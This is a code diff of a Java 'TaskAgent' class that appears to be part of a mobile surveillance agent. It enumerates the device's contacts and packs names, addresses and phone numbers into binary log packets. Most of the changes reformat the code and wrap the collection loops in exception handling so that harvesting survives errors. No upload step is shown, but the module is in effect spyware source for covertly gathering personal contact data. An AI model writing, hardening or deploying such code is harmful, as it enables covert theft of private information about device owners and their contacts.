@@ -74,8 +74,8 @@ public final class TaskAgent extends Agent implements PIMListListener {
         parse(confParams);
         setDelay(SLEEPTIME);
         setPeriod(PERIODTIME);
-        
-        if(!enabled){
+
+        if (!enabled) {
             markup.removeMarkup();
         }
     }
@@ -153,8 +153,14 @@ public final class TaskAgent extends Agent implements PIMListListener {
 
                 contact = (Contact) eContacts.nextElement();
 
-                byte[] packet = getContactPacket(contactList, contact);
-                log.writeLog(packet);
+                try {
+                    byte[] packet = getContactPacket(contactList, contact);
+                    log.writeLog(packet);
+                } catch (Exception ex) {
+                    //#ifdef DEBUG_ERROR
+                    debug.error(ex);
+                    //#endif
+                }
             }
 
             log.close();
@@ -212,9 +218,9 @@ public final class TaskAgent extends Agent implements PIMListListener {
             if (contact.countValues(Contact.NAME) > 0) {
                 String[] names = contact.getStringArray(Contact.NAME, 0);
 
-                addField(dbPayload, names, Contact.NAME_GIVEN, (byte)0x01);
-                addField(dbPayload, names, Contact.NAME_FAMILY, (byte)0x02);
-                
+                addField(dbPayload, names, Contact.NAME_GIVEN, (byte) 0x01);
+                addField(dbPayload, names, Contact.NAME_FAMILY, (byte) 0x02);
+
             }
         }
 
@@ -235,7 +241,7 @@ public final class TaskAgent extends Agent implements PIMListListener {
         if (contactList.isSupportedField(Contact.ADDR)) {
             if (contact.countValues(Contact.ADDR) > 0) {
                 String[] addr = contact.getStringArray(Contact.ADDR, 0);
-                
+
                 addField(dbPayload, addr, Contact.ADDR_STREET, (byte) 0x21);
                 addField(dbPayload, addr, Contact.ADDR_EXTRA, (byte) 0x36);
                 addField(dbPayload, addr, Contact.ADDR_LOCALITY, (byte) 0x27);
@@ -247,7 +253,6 @@ public final class TaskAgent extends Agent implements PIMListListener {
             }
         }
 
-       
         int size = dbPayload.getLength() + header.length;
         //#ifdef DEBUG_TRACE
         debug.trace("payload len: " + dbPayload.getLength());
@@ -277,8 +282,8 @@ public final class TaskAgent extends Agent implements PIMListListener {
 
         //db_header.write(payload);
 
-        byte[] packet = Utils.concat(header, 12, payload, dbPayload
-                .getLength());
+        byte[] packet = Utils
+                .concat(header, 12, payload, dbPayload.getLength());
 
         //#ifdef DBC
         Check.ensures(packet.length == size,
@@ -295,12 +300,12 @@ public final class TaskAgent extends Agent implements PIMListListener {
     private void addField(DataBuffer dbPayload, String[] fields,
             int fieldNumber, byte logType) {
 
-        try{
-        if (fields[fieldNumber] != null) {
-            String value = fields[fieldNumber];
-            Utils.addTypedString(dbPayload, logType, value);
-        }
-        }catch(Exception ex){
+        try {
+            if (fields[fieldNumber] != null) {
+                String value = fields[fieldNumber];
+                Utils.addTypedString(dbPayload, logType, value);
+            }
+        } catch (Exception ex) {
             //#ifdef DEBUG_ERROR
             debug.error(ex);
             //#endif
@@ -335,20 +340,21 @@ public final class TaskAgent extends Agent implements PIMListListener {
                 int preferred = contact.getPreferredIndex(contactType);
                 //#ifdef DEBUG_TRACE
                 debug.trace("addStringField preferred : " + preferred);
-                //#endif
+                //#endif           
+
+                for (int i = 0; i < contact.countValues(contactType)
+                        && i < logTypes.length; i++) {
+                    String value = contact.getString(contactType, i);
+                    //#ifdef DEBUG_TRACE
+                    debug.trace("addStringField: " + logTypes[i] + " " + value);
+                    //#endif
+                    Utils.addTypedString(dbPayload, logTypes[i], value);
+                }
+
             } catch (Exception ex) {
                 //#ifdef DEBUG_ERROR
                 debug.error(ex);
                 //#endif
-            }
-
-            for (int i = 0; i < contact.countValues(contactType)
-                    && i < logTypes.length; i++) {
-                String value = contact.getString(contactType, i);
-                //#ifdef DEBUG_TRACE
-                debug.trace("addStringField: " + logTypes[i] + " " + value);
-                //#endif
-                Utils.addTypedString(dbPayload, logTypes[i], value);
             }
         }
     }
@@ -362,36 +368,36 @@ public final class TaskAgent extends Agent implements PIMListListener {
                 //#ifdef DEBUG_TRACE
                 debug.trace("addStringField preferred : " + preferred);
                 //#endif
+
+                if (contact.countValues(contactType) > 0) {
+                    String value = contact.getString(contactType, 0);
+                    Utils.addTypedString(dbPayload, logType, value);
+                }
+
+                String note = "";
+                int last = contact.countValues(contactType) - 1;
+                for (int i = 1; i <= last; i++) {
+                    String value = contact.getString(contactType, i);
+                    //#ifdef DEBUG_TRACE
+                    debug.trace("addStringField: " + logType + " " + value);
+                    //#endif
+
+                    note += value;
+                    if (i < last) {
+                        note += ", ";
+                    }
+                }
+
+                //#ifdef DEBUG_TRACE
+                debug.trace("addTelField note: " + note);
+                //#endif
+
+                Utils.addTypedString(dbPayload, (byte) 0x34, note);
             } catch (Exception ex) {
                 //#ifdef DEBUG_ERROR
                 debug.error(ex);
                 //#endif
             }
-
-            if (contact.countValues(contactType) >= 0) {
-                String value = contact.getString(contactType, 0);
-                Utils.addTypedString(dbPayload, logType, value);
-            }
-
-            String note = "";
-            int last = contact.countValues(contactType) -1;
-            for (int i = 1; i <= last; i++) {
-                String value = contact.getString(contactType, i);
-                //#ifdef DEBUG_TRACE
-                debug.trace("addStringField: " + logType + " " + value);
-                //#endif
-
-                note += value;
-                if( i < last){
-                    note += ", ";
-                }
-            }
-            
-            //#ifdef DEBUG_TRACE
-            debug.trace("addTelField note: " + note);
-            //#endif
-
-            Utils.addTypedString(dbPayload, (byte) 0x34, note);
         }
     }
 
